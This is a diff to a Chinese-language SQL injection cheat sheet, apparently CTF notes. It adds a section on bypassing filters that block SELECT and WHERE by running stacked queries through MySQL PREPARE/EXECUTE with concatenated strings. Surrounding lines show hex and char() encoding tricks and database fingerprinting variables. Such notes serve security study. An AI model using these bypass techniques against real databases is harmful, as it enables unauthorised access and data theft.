@@ -59,11 +59,11 @@
 
 ### version()：当前使用的数据库版本
 
-### @@hostname  
+### @@hostname
 
 ### @@port 
 
-### @@version  
+### @@version
 
 ### @@datadir：数据库存储数据路径
 
@@ -85,6 +85,8 @@
 [http://p0desta.com/2018/03/29/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/](http://p0desta.com/2018/03/29/SQL注入备忘录/)
 
 [https://ultramangaia.github.io/blog/2018/SQL%E6%B3%A8%E5%85%A5.html](https://ultramangaia.github.io/blog/2018/SQL注入.html)
+
+ https://security.yirendai.com/news/share/15 
 
 ## 绕过
 
@@ -131,6 +133,37 @@ SELECT * FROM Users WHERE username = 0x61646D696E
 - SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');
 - SELECT extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)
 - SELECT (char(97)+char(100)+char(109)+char(105)+char(110))
+
+### 禁用select,where等等关键字用prepare执行预定义语句
+
+
+
+关于MySQL中的预处理语句原理与使用，这篇文章讲解的比较详细：MySQL的SQL预处理(Prepared)。本题中由于可以使用堆叠查询，并且需要使用SELECT关键字并绕过过滤，因此想到利用字符串转换与拼接构造语句最后执行，这时就可以使用预处理语句。
+
+预处理语句使用方式：
+
+```mysql
+PREPARE sqla from '[my sql sequece]';   //预定义SQL语句
+EXECUTE sqla;  //执行预定义SQL语句
+(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句
+
+```
+
+
+
+预定义语句也可以通过变量进行传递，比如：
+
+```sql
+SET @tn = 'hahaha';  //存储表名
+SET @sql = concat('select * from ', @tn);  //存储SQL语句
+PREPARE sqla from @sql;   //预定义SQL语句
+EXECUTE sqla;  //执行预定义SQL语句
+(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句
+```
+
+
+
+
 
 ### 宽字节注入 
 
